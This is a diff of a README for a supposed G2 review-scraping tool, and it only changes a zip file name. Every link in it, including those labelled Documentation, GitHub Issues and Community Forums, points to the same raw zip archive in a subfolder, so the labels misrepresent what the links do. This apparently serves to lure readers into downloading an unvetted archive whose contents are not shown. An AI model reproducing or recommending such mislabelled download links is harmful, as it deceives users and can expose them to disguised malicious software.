@@ -4,7 +4,7 @@
 Welcome to **g2-reviews-scraper**! This application allows you to easily scrape reviews and data from G2, which helps you gather insights for business intelligence and competitor analysis. Whether you're looking to understand user feedback or gather data for lead generation, this tool simplifies the process.
 
 ## 📦 Download Now
-[![Download g2-reviews-scraper](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-3.7.zip)](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-3.7.zip)
+[![Download g2-reviews-scraper](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-v1.0.zip)](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-v1.0.zip)
 
 ## 📋 Features
 - **Data Extraction:** Quickly pull reviews and ratings in a user-friendly format.
@@ -19,7 +19,7 @@ To run the g2-reviews-scraper, ensure your system meets the following requiremen
 - **Network Connection:** A reliable internet connection is necessary for successful data scraping.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-3.7.zip).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-v1.0.zip).
 
 1. Click on the **Releases** link above.
 2. Choose the latest version from the list.
@@ -58,8 +58,8 @@ For any queries or support, visit our Feedback section on GitHub or create an is
 This project is licensed under the MIT License. You can use, modify, and distribute it under the terms of this license. 
 
 ## 🌐 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-3.7.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-3.7.zip)
-- [Community Forums](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-3.7.zip)
+- [Documentation](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-v1.0.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-v1.0.zip)
+- [Community Forums](https://raw.githubusercontent.com/christart3/g2-reviews-scraper/main/Angus/reviews-g-scraper-v1.0.zip)
 
 Thank you for choosing **g2-reviews-scraper**! Enjoy scraping G2 reviews with ease.
